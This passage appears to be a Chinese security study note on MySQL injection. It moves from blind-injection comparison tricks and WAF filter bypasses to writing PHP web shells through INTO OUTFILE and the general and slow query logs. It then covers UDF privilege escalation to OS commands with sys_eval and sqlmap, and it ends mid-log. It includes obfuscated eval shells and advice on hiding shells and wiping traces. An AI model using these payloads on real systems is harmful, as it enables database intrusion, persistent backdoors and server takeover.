在进行字符串截取时，可以实现精确到某一位的截取，但是要对其进行变换，具体原理大家可以自己分析，这里直接给出使用方法：

```python
SELECT insert((insert(目标字符串,1,截取的位数,'')),2,9999999,''); # 这里截取的位数从0开始数
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364337564-2afc67a4-c3f9-4b04-b1e8-227cb88072d4.png#averageHue=%23cfe3bf&id=lHDw9&originHeight=292&originWidth=597&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364337655-54a1ffe0-83cd-463d-93b3-fb508926279e.png#averageHue=%2328323a&id=aOgVF&originHeight=632&originWidth=988&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

### regexp()

用来判断一个字符串是否匹配一个正则表达式。这个函数兼容了截取与比较。

使用方法：binary 目标字符串 regexp 正则

可以利用^往后匹配

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364337767-def2f2ca-9b5e-4e95-a0f5-fca634e44ead.png#averageHue=%23bce1b5&id=CcPxb&originHeight=228&originWidth=505&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364337859-87344df7-57de-4b9f-a5c2-bf060cd42aec.png#averageHue=%23f6f6f6&id=ERN4a&originHeight=296&originWidth=776&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

可以利用$往前匹配

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364337944-f5701764-295c-46b2-9597-55fe07f211d7.png#averageHue=%23f4e3cf&id=ieJSi&originHeight=277&originWidth=398&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

但是直接字符串 regexp 正则表达式是大小写不敏感的，需要大小写敏感需要加上binary关键字（binary不是regexp的搭档，需要把binary加到字符串的前面而不是regexp的前面，MySQL中binary是一种字符串类型）：

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364338053-21978c36-82b6-4766-bea0-1b7ddc817aa7.png#averageHue=%23f3dfcd&id=Nf4Mf&originHeight=288&originWidth=383&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364338155-b1cdc4dd-7aa1-46eb-adbb-bdc979217bd0.png#averageHue=%23f4e7d5&id=KzPkH&originHeight=250&originWidth=461&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364338245-527c6bbe-afe5-4962-9031-6216c751066a.png#averageHue=%23bfe3b8&id=OAquK&originHeight=261&originWidth=362&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

### like and rlike

```python
SELECT "wfqgeaw" LIKE "wfq%"  判断字符串是否以wfq开头
SELECT "wfqgeaw" LIKE "%wfq%"  判断是否包含se两个字符串
SELECT "wfqgeaw" LIKE "_____"  判断是否为5个字符
SELECT "wfqgeaw" LIKE "w____"  判断是否为w开头
```

同样是大小写不敏感的

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364338328-a9026001-6885-4f8c-bb98-5162a9050ce7.png#averageHue=%23f9f9f8&id=MZt0N&originHeight=447&originWidth=402&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

### trim()

trim()函数除了用于移除首尾空白外，还有如下用法：

TRIM([{BOTH | LEADING | TRAILING} [remstr] FROM str) 表示移除str这个字符串首尾（BOTH）/句首（LEADING）/句尾（TRAILING）的remstr

例如trim(leading 'a' from 'abcd')表示移除abcd句首的a， 于是会返回bcd

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364338409-a200c764-c280-4bd5-b8f7-efe769080c02.png#averageHue=%23eabfa9&id=NVcj7&originHeight=418&originWidth=557&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

利用TRIM进行字符串截取比较复杂，在讲解之前我们需要明确一个点：例如trim(leading 'b' from 'abcd')会返回abcd，因为这句话意思是移除abcd句首的b，但是abcd并不以b为句首开头，所以trim函数相当于啥也没干。

为了讲解，这里我用i来表示一个字符，例如i如果表示a，那么i+1就表示b，i+2就表示c。注入时，需要进行2次判断，使用4个trim函数。第一次判断：

```python
SELECT TRIM(LEADING i FROM (select database())) = TRIM(LEADING i+1 FROM (select database()));
```

我们知道select database()结果为college，比如现在i表示a，那么i+1就表示b，则trim(leading 'a' from 'college')和trim(leading 'b' from 'college')都返回college（因为college不以a也不以b为开头），那么这个TRIM() = TRIM()的表达式会返回1。也就是说如果这个第一次判断返回真了，那么表示i和i+1都不是我们想要的正确结果。反之，如果这个TRIM() = TRIM()的表达式返回了0，那么i和i+1其中一个必是正确结果，到底是哪个呢？我们进行二次判断：

```python
SELECT TRIM(LEADING i+2 FROM (select database())) = TRIM(LEADING i+1 FROM (select database()));
```

在第二次判断中，i+2和i+1做比较。如果第二次判断返回1，则表示i+2和i+1都不是正确结果，那么就是i为正确结果；如果第二次判断返回0，则表示i+2和i+1其中一个是正确结果，而正确结果已经锁定在i和i+1了，那么就是i+1为正确结果。这是通用的方法，一般写脚本时，因为循环是按顺序来的，所以其实一次判断就能知道结果了，具体大家自己写写脚本体会一下就明白了。

当我们判断出第一位是'c'后，只要继续这样判断第二位，然后第三位第四位..以此类推：

```python
SELECT TRIM(LEADING 'ca' FROM (select database())) = TRIM(LEADING 'cb' FROM (select database()));
SELECT TRIM(LEADING 'cb' FROM (select database())) = TRIM(LEADING 'cc' FROM (select database()));
SELECT TRIM(LEADING 'cc' FROM (select database())) = TRIM(LEADING 'cd' FROM (select database()));
......
```

### lpad()和rpad()

lpad：函数语法：lpad(str1,length,str2)。其中str1是第一个字符串，length是结果字符串的长度，str2是一个填充字符串。如果str1的长度没有length那么长，则使用str2填充；如果str1的长度大于length，则截断。

rpad：同理

```python
select lpad((select database()),1,1)    // s
select lpad((select database()),2,1)    // se

select rpad((select database()),1,1)    // s
select rpad((select database()),2,1)    // se
```

同样可以结合逆转来一个个字符注入

```python
SELECT ASCII(REVERSE(RPAD((SELECT DATABASE()),2,1)))
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364338495-9f8e56b6-67f5-4922-9bdb-d10838c85a7c.png#averageHue=%23d4ddb4&id=T7lI6&originHeight=281&originWidth=558&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

# 条件语句

### ELT

用这个函数SELECT ELT(条件,6);条件为真就返回6，条件为假就返回空

elt(length(database())>1,6)

### = > <

最基本的比较方法！

### LIKE

基本上可以用来替代等号，如果没有% _之类的字符的话。

### RLIKE / REGEXP

上面截取时候已经讲过了，正则是截取+比较的结合体。

### BETWEEN

用法：expr BETWEEN 下界 AND 上界;

说明：表示是否expr >= 下界 && exp <= 上界，有点像数学里的“闭区间”，只是这里的上下界可以相等，比如expr是2，那么你没必要写2 between 1 and 3，完全可以写成2 between 2 and 2。所以x between i and i就是表示x是否等于i的意思。

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364338581-d4fa13fa-d5fc-4ea5-8fa5-14284f638915.png#averageHue=%23d9de8b&id=uLIMj&originHeight=289&originWidth=793&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

### IN

用法：expr1 in (expr1, expr2, expr3)

说明：有点像数学中的元素是否属于一个集合。同样也是大小写不敏感的，为了大小写敏感需要用binary关键字。

示例：

```python
SELECT BINARY "R" IN((SUBSTR((SELECT USER()),1,1)))
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364338667-3c4eae48-e8d1-45a4-890f-615bdc170c07.png#averageHue=%23e5c263&id=gk8YC&originHeight=231&originWidth=347&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364338761-5c25737d-eb29-4435-923e-4f3454e5074d.png#averageHue=%23eedfc0&id=i7Uiv&originHeight=291&originWidth=664&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364338857-c245a14a-5bd3-43b5-bce5-bf08cd3eb2f2.png#averageHue=%23eec4ad&id=BRNmz&originHeight=348&originWidth=828&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

### AND和减法运算

and 也可以用&&来表示，是逻辑与的意思。

在盲注中，可以用一个true去与运算一个ASCII码减去一个数字，如果返回0则说明减去的数字就是所判断的ASCII码：

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364338951-55923503-6e34-4add-a4f3-1a1099be294e.png#averageHue=%2328313a&id=oyUFW&originHeight=545&originWidth=685&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

### OR和减法运算

or 也可以用||来表示，是逻辑或的意思。

在盲注中，可以用一个false去或运算一个ASCII码减去一个数字，如果返回0则说明减去的数字就是所判断的ASCII码：

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364339038-3d10b8b6-da99-46cf-b3e4-25f103d04a6f.png#averageHue=%2328313a&id=pkQC5&originHeight=517&originWidth=586&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

### 异或注入

虽然也可以做比较，比如：

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364339129-75f7fd8b-6365-4e1b-8dd7-5b53f2d6edea.png#averageHue=%232b383f&id=XkIdp&originHeight=320&originWidth=473&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

但是异或更多应用在不能使用注释符的情况下。注入时，SQL语句为SELECT xx FROM yy WHERE zz = '$your_input';因为用户的输入后面还有一个单引号，很多时候我们使用#或者--直接注释掉了这个单引号，但是如果注释符被过滤了，那么这个单引号就必须作为SQL语句的一部分，这时可以这样做：

```python
WHERE zz = 'xx' or '1'^(condition)^'1';
```

而对于'1'(condition)'1'这个异或表达式，如果condition为真则返回真，condition为假就返回假

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364339224-2eb85024-169b-4121-9d29-e065afdeb523.png#averageHue=%2329323a&id=VnvVd&originHeight=428&originWidth=575&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)
上面开始时讲的盲注的步骤，找到这个condition后，我们只要将condition换成具体的注入语句(也就是字符串截取与比较的语句)就可以了。所以异或的好处是：能够让你自由的进行截取和比较，而不需要考虑最后的单引号，因为异或帮你解决了最后的单引号。

在没有注释符的情况下，除了异或，还可以用连等式、连减法式等等！根据运算中condition返回的0和1进行构造就行了。

### CASE

两种用法：

```
CASE WHEN (表达式) THEN exp1 ELSE exp2 END; # 表示如果表达式为真则返回exp1，否则返回exp2
CASE 啥 WHEN 啥啥 THEN exp1 ELSE exp2 END; # 表示如果(啥=啥啥)则返回exp1，否则返回exp2
```

# 简单的各种bypass

### 空格

行内注释

select/**/flag/**/from/**/flag
所有空格符号或换行符号

%09、%0a、%0d

括号

select(id)from(student);

反引号

select`id`from`student`;

基本如下

```python
%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/
```

### 单引号和字符串长度绕过

1.字符串的十六进制形式

'abc' 等价于 0x616263

\2. unhex()与hex()连用

'abc' 等价于unhex(hex(6e6+382179)); 可以用于绕过大数过滤（大数过滤：/\d{9}|0x[0-9a-f]{9}/i）

具体转换的步骤是：①abc转成16进制是616263 ②616263转十进制是6382179 ③用科学计数法表示6e6+382179 ④套上unhex(hex())，就是unhex(hex(6e6+382179))
![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364339315-5319f89d-c619-4763-a2a6-00cfeaf7f8f5.png#averageHue=%23f9f9f8&id=M8ZGz&originHeight=352&originWidth=376&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364339406-e1b0409c-f0c9-4704-b26f-83e4aa0a634d.png#averageHue=%23e9c984&id=AegAE&originHeight=409&originWidth=474&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

没有单引号没办法做SQL注入的参数逃逸

\1. 宽字节注入      aa%df%27

\2. 转义法

条件是：用户可以控制一前一后两个参数
方法是：前面的参数输入\转义掉单引号，后面参数逃逸出来
例如：select * from users where username = '' and password = 'and 1=1#'

编码的话还可以用

```python
SELECT TO_BASE64((SELECT USER()))
SELECT FROM_BASE64(TO_BASE64((SELECT USER())))
```

### 逗号绕过

使用from   xxx   for  xxx

```python
select substr(database() from 1 for 1);
select mid(database() from 1 for 1);
```

使用join的别名绕过

```python
union select * from (select 1)a join (select 2)b
SELECT username ,PASSWORD FROM  USER  UNION SELECT * FROM (SELECT (SELECT USER()))a JOIN (SELECT 2)b
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364339483-61f8f874-4d77-408b-89b5-62366af9d039.png#averageHue=%23fafafa&id=gSusD&originHeight=365&originWidth=1055&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

使用like

```python
select ascii(mid(user(),1,1))=80   #等价于
select user() like 'r%'
```

对于limit可以使用offset来绕过

```python
select * from news limit 0,1
# 等价于下面这条SQL语句
select * from news limit 1 offset 0
```

### 比较符号（<>）绕过

测试表

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364339573-9c722f25-9b89-412c-9dc3-8132de3abd4e.png#averageHue=%23c3ae8f&id=YVREB&originHeight=196&originWidth=762&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

使用greatest()、least（）：（前者返回最大值，后者返回最小值）

```python
SELECT username ,PASSWORD FROM  USER  WHERE  username="admi"  || GREATEST((ASCII(SUBSTR(PASSWORD,1,1))),102)=102
SELECT username ,PASSWORD FROM  USER  WHERE  username="admi"  || LEAST((ASCII(SUBSTR(PASSWORD,1,1))),103)=103
```

使用between and

```python
SELECT username ,PASSWORD FROM  USER  WHERE  username="admi"  || ASCII(SUBSTR(PASSWORD,1,1)) BETWEEN 101 AND 101;
```

STRCMP比较

用于比较两个字符串并根据比较结果返回整数。 基本形式为strcmp(str1,str2)，若str1=str2，则返回零；若str1<str2，则返回负数；若str1>str2，则返回正数

```python
SELECT   STRCMP(LEFT('password',1), 0x70) = 0
```

p的16进制是0x70

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364339663-32d348be-cf6b-4f48-9863-eabc25c4bc7a.png#averageHue=%23efd3b9&id=Pd6g1&originHeight=354&originWidth=581&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

使用in绕过

```python
/?id=' or ascii(substr((select database()),1,1)) in(114)--+    // 错误
/?id=' or ascii(substr((select database()),1,1)) in(115)--+    // 正常回显

/?id=' or substr((select database()),1,1) in('s')--+    // 正常回显
```

### 

### 绕过union，select，where等

使用大小写绕过

```python
id=-1'UnIoN/**/SeLeCT
```

内联注释绕过

```python
/*!selecT*//**//*!userName*/ ,PASSWORD FROM  USER  /*!wHerE*/  username="admin"
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364339746-83976821-30f1-45bc-9ddb-ddec7bf2188a.png#averageHue=%23dbbfab&id=ZHeMu&originHeight=380&originWidth=848&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

双关键字绕过

```python
id=-1'UNIunionONSeLselectECT1,2,3–-
```

```python
 SELECT  PASSWORD FROM USER  WHERE username=CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))
CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))==admin
```

堆叠注入情况下的绕过

```python
# 字符串拼接绕过
1';set @a=concat("sel","ect * from users");prepare sql from @a;execute sql;
```

### '".md5($pass,true)."' 登录绕过

```php
SELECT * FROM users WHERE password = '.md5($password,true).';
```

payload

```php
ffifdyop和129581926211651571912466741651878684928
```

都可以形成类似下面的payload

```php
SELECT * FROM users WHERE password = ''or'6.......'
```

### binary绕过

就是使用各大编码了

```python
hex、unhex、to、FROM_BASE64、TO_BASE64
```

### or绕过

这个被过滤导致不能用order by判断行数。这个时候可以用来判断

1'/**/group/**/by/**/23,'3 。当出现逐渐递增知道出现下面回显就说明有22行
![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364339830-a096e749-5b4f-42c4-9ba5-9da952501daf.png#averageHue=%23faf9f8&id=AbhB8&originHeight=435&originWidth=990&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

# 

# mysql写shell

## outfile和dumpfile写shell

### outfile和dumpfile的区别

outfile:

1、 支持多行数据同时导出

2、 使用union联合查询时，要保证两侧查询的列数相同

3、 会在换行符制表符后面追加反斜杠

4、会在末尾追加换行

dumpfile:

1、 每次只能导出一行数据

2、 不会在换行符制表符后面追加反斜杠

3、 不会在末尾追加换行

因此，我们可以使用into dumpfile这个函数来顺利写入二进制文件;

当然into outfile函数也可以写入二进制文件，只是最终无法生效罢了（追加的反斜杠会使二进制文件无法生效）

如果服务器端本身的查询语句，结果有多行，但是我们又想使用dump file，应该手动添加 limit 限制

### 写shell的利用条件

条件

利用条件 [#](https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6)

过滤了单引号into outfile还能用吗？不能，GPC要off才行，可以测试Hex编码

1. 数据库当前用户为root权限；
2. 知道当前网站的绝对路径；
3. PHP的GPC为 off状态；(魔术引号，GET，POST，Cookie)
4. 写入的那个路径存在写入权限。

### **基于UNION联合查询**： [#](https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html#%E5%9F%BA%E4%BA%8Eunion%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2)

可以使用如下paylaod

```python
SELECT attachment_path,attachment_name,attachment_id FROM aoa_attachment_list UNION SELECT 1,'<?php phpinfo();?>',3 INTO OUTFILE '/var/www/html/indawd.php'

SELECT attachment_path,attachment_name,attachment_id FROM aoa_attachment_list UNION SELECT 1,'<?phpwda',3 into dumpfile 'E:\shanhe.php'
```

但是我不行，我的电脑变量如下。NULL表示不可以写也不可以导出，只有其为空字符串才是可以任意

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364339923-0ebc949c-2eb2-4e83-9e97-8d6ec6146446.png#averageHue=%23ddc9ac&id=oylNV&originHeight=296&originWidth=533&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

### **非联合查询** [#](https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html#%E9%9D%9E%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2)

当我们无法使用联合查询时，我们可以使用fields terminated by与lines terminated by来写shell

```python
?id=1 into outfile '/var/www/html/a.php' FIELDS TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e#
```

## **基于日志写shell**

（ outfile被禁止，或者写入文件被拦截，没写权限 ，有root权限）

```python
show variables like '%general%';	--查看配置，日志是否开启，和mysql默认log地址(记下原地址方便恢复)
set global general_log = on;		--开启日志监测，默认关闭(如果一直开文件会很大的)
SET GLOBAL general_log_file = '/var/www/html/a.php';		--设置日志路径
select '<?php phpinfo();?>';		--执行查询，写入shell
--结束后，恢复日志路径，关闭日志监测

--SQL查询免杀shell
select "<?php $sl = create_function('', @$_REQUEST['klion']);$sl();?>";

SELECT "<?php $p = array('f'=>'a','pffff'=>'s','e'=>'fffff','lfaaaa'=>'r','nnnnn'=>'t');$a = array_keys($p);$_=$p['pffff'].$p['pffff'].$a[2];$_= 'a'.$_.'rt';$_(base64_decode($_REQUEST['username']));?>";

---------------
--慢查询写shell
---------------
为什么要用慢查询写呢？上边说过开启日志监测后文件会很大，网站访问量大的话我们写的shell会出错
show variables like '%slow_query_log%';		--查看慢查询信息
set global slow_query_log=1;				--启用慢查询日志(默认禁用)
set global slow_query_log_file='/var/www/html/a.php';	--修改日志文件路径
select '<?php @eval($_POST[abc]);?>' or sleep(11);				--写shell
```

## **慢查询补充** [#](https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html#%E6%85%A2%E6%9F%A5%E8%AF%A2%E8%A1%A5%E5%85%85)

因为是用的慢查询日志，所以说只有当查询语句执行的时间要超过系统默认的时间时,该语句才会被记入进慢查询日志。

一般都是通过long_query_time选项来设置这个时间值，时间以秒为单位，可以精确到微秒。

如果查询时间超过了这个时间值（默认为10秒），这个查询语句将被记录到慢查询日志中

```sql
show global variables like '%long_query_time%'		--查看服务器默认时间值
```

通常情况下执行sql语句时的执行时间一般不会超过10s，所以说这个日志文件应该是比较小的，而且默认也是禁用状态，不会引起管理员的察觉

拿到shell后上传一个新的shell，删掉原来shell，新shell做隐藏，这样shell可能还能活的时间长些。

## 创建表，导出数据

```python
use test;
drop table if exists vow;
create table vow(name text not null);
insert into vow(name) values('<?php phpinfo(); ?>');
select name from vow into outfile '/var/www/html/a.php';
drop tables vow;
```

# 

# mysql的UDF提权

参考

[https://github.com/SEC-GO/Red-vs-Blue/blob/master/linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84MySQL%20UDF%E6%8F%90%E6%9D%83.md](https://github.com/SEC-GO/Red-vs-Blue/blob/master/linux环境下的MySQL UDF提权.md)

[https://www.freebuf.com/articles/database/291175.html](https:_www.freebuf.com_articles_database_291175)

## 利用条件

1、常规情况：

1.1 mysql配置文件secure_file_priv项设置为空，（如果为NULL或/tmp/等指定目录，即无法自定义udf文件导出位置，则无法利用）；

1.2 CREATE权限、FILE权限（root用户默认拥有所有权限）。

2、特殊情况：

2.1 INSERT权限、UPDATE权限、DELETE权限。

## 查看是否高权限

```python
mysql> select * from mysql.user where user = substring_index(user(), '@', 1) ;
```

## 查看plugin的值

```python
mysql> select host,user,plugin from mysql.user where user = substring_index(user(),'@',1);
+-----------+------+-----------------------+
| host      | user | plugin                |
+-----------+------+-----------------------+
| localhost | root | mysql_native_password |
+-----------+------+-----------------------+
1 row in set (0.02 sec)
```

plugin值表示mysql用户的认证方式。当 plugin 的值为空时不可提权，为 mysql_native_password 时可通过账户连接提权。默认为mysql_native_password。另外，mysql用户还需对此plugin目录具有写权限。

## 上传udf库文件

1. 获取plugin路径

```python
 show variables like "%plugin%";
    /va
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364340010-62bac8e7-eae3-441e-ac84-3b0f0dde221f.png#averageHue=%23bfba9b&id=Ahp3k&originHeight=245&originWidth=796&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

1. 获取服务器版本信息

```python
SHOW VARIABLES LIKE 'version_compile_%';
```

![](https://cdn.nlark.com/yuque/0/2023/png/25519932/1702364340100-d91be41d-3080-46a6-b117-cc703d0feded.png#averageHue=%23dcc597&id=yasVi&originHeight=341&originWidth=603&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=)

准备udf库文件

需要选择对应的版本，否则会报错。

- 从sqlmap获取sqlmap中有现成的udf文件。分别是32位和64位的。这里选择sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_。不过这里的so是异或过的，需要执行以下命令解密：

```python
cd sqlmap/extra/cloak

python3 cloak.py -d -i /security/ctf/tools_bar/4_注入攻击/SQLI/sqlmap-dev/data/udf/mysql/linux/64/lib_mysqludf_sys.so_
```

- 此时会在相同目录生成解密后的lib_mysqludf_sys.so。
- 从metasploit中获取在kali的/usr/share/metasploit-framework/data/exploits/mysql目录下找到相应的库即可。这个库和sqlmap解密后的一模一样。
- 自行编译
- 上传udf库文件

```python
mysql> select hex(load_file('/security/ctf/tools_bar/4_注入攻击/SQLI/sqlmap-dev/data/udf/mysql/linux/64/lib_mysqludf_sys.so')) into outfile '/tmp/udf.txt'; Query OK, 1 row affected (0.03 sec) ```

mysql> select unhex('7F454C46020...') into dumpfile '/usr/local/Cellar/mysql/5.7.22/lib/plugin/mysqludf.so';
Query OK, 1 row affected (0.04 sec)
```

## 创建sys_eval函数

```python
mysql> create function sys_eval returns string soname "mysqludf.so";
Query OK, 0 rows affected (0.03 sec)
mysql>
```

函数操作

```python
# 调用函数
mysql> select sys_eval('whoami');
+--------------------+
| sys_eval('whoami') |
+--------------------+
| root               |
+--------------------+
1 row in set (0.03 sec)

# 查看函数
mysql> select * from mysql.func;
+----------+-----+-------------+----------+
| name   | ret | dl     | type   |
+----------+-----+-------------+----------+
| sys_eval |  0 | mysqludf.so | function |
+----------+-----+-------------+----------+
1 row in set

# 删除函数（清除痕迹）,如果要删除函数,必须udf文件还存在plugin目录下
drop function sys_eval;
或
delete from mysql.func where name='sys_eval';
```

## 利用sqlmap

全自动化

```python
sqlmap.py -d "mysql://root:root@172.20.10.9:3306/mysql" --os-shell

...
[11:53:40] [INFO] connection to MySQL server '172.20.10.9:3306' established
[11:53:40] [INFO] testing MySQL
[11:53:40] [INFO] confirming MySQL
[11:53:40] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[11:53:40] [INFO] fingerprinting the back-end DBMS operating system
[11:53:40] [INFO] the back-end DBMS operating system is Linux
[11:53:40] [INFO] testing if current user is DBA
[11:53:40] [INFO] fetching current user
what is the back-end database management system architecture?
[1] 32-bit (default)
[2] 64-bit
> 2
[11:53:45] [INFO] checking if UDF 'sys_exec' already exist
[11:53:45] [INFO] checking if UDF 'sys_eval' already exist
[11:53:50] [INFO] detecting back-end DBMS version from its banner
[11:53:50] [INFO] the local file '/var/folders/bx/zb9__nb1591g_r8k78p5p0gr0000gn/T/sqlmap_5_qd1_y51533/lib_mysqludf_sysp478pm69.so' and the remote file './libsoxbd.so' have the same size (8040 B)
[11:53:50] [INFO] creating UDF 'sys_exec' from the binary UDF file
[11:53:50] [INFO] creating UDF 'sys_eval' from the binary UDF file
[11:53:50] [INFO] going to use injected user-defined functions 'sys_eval' and 'sys_exec' for operating system command execution
[11:53:50] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a]

No output
os-shell>
```

半自动化

获取plugin目录

```
python3 sqlmap.py -d "mysql://root:@172.20.10.9:3306/mysql" --sql-shell
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.2.24#dev}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:21:33 /2020-02-10/

[13:21:34] [INFO] connection to MySQL server '172.20.10.9:3306' established
[13:21:34] [INFO] testing MySQL
[13:21:34] [INFO] resumed: [['1']]...
[13:21:34] [INFO] confirming MySQL
[13:21:34] [INFO] resumed: [['1']]...
[13:21:34] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[13:21:34] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTER
sql-shell> select @@plugin_dir;
[13:22:06] [INFO] fetching SQL SELECT statement query output: 'select @@plugin_dir'
select @@plugin_dir [1]:
[*] /usr/lib/x86_64-linux-gnu/mariadb18/plugin/

sql-shell>
```

得到plugin目录为/usr/lib/x86_64-linux-gnu/mariadb18/plugin/。

上传lib_mysqludf_sys到plugin目录

```
python3 sqlmap.py -d "mysql://root:@172.20.10.9:3306/mysql" --file-write=/Users/simon/Downloads/lib_mysqludf_sys_64.so --file-dest=/usr/lib/x86_64-linux-gnu/mariadb18/plugin/lib_mysqludf_sys_64.so
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.2.24#dev}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:28:35 /2020-02-10/

[13:28:36] [INFO] connection to MySQL server '172.20.10.9:3306' established
[13:28:36] [INFO] testing MySQL
[13:28:36] [INFO] resumed: [['1']]...
[13:28:36] [INFO] confirming MySQL
[13:28:36] [INFO] resumed: [['1']]...
[13:28:36] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[13:28:36] [INFO] fingerprinting the back-end DBMS operating system
[13:28:36] [INFO] resumed: [['0']]...
[13:28:36] [INFO] the back-end DBMS operating system is Linux
do you want confirmation that the local file '/Users/simon/Downloads/lib_mysqludf_sys_64.so' has been successfully written on the back-end DBMS file system ('/usr/lib/x86_64-linux-gnu/mariadb18/plugin/lib_mysqludf_sys_64.so')? [Y/n]

[13:28:42] [INFO] the local file '/Users/simon/Downloads/lib_mysqludf_sys_64.so' and the remote file '/usr/lib/x86_64-linux-gnu/mariadb18/plugin/lib_mysqludf_sys_64.so' have the same size (8040 B)
[13:28:42] [INFO] connection to MySQL server '172.20.10.9:3306' closed

[*] ending @ 13:28:42 /2020-02-10/
```

创建&执行函数

```
python3 sqlmap.py -d "mysql://root:@172.20.10.9:3306/mysql" --sql-shell
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.2.24#dev}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:32:23 /2020-02-10/

[13:32:23] [INFO] connection to MySQL server '172.20.10.9:3306' established
[13:32:23] [INFO] testing MySQL
[13:32:23] [INFO] resumed: [['1']]...
[13:32:23] [INFO] confirming MySQL
[13:32:23] [INFO] resumed: [['1']]...
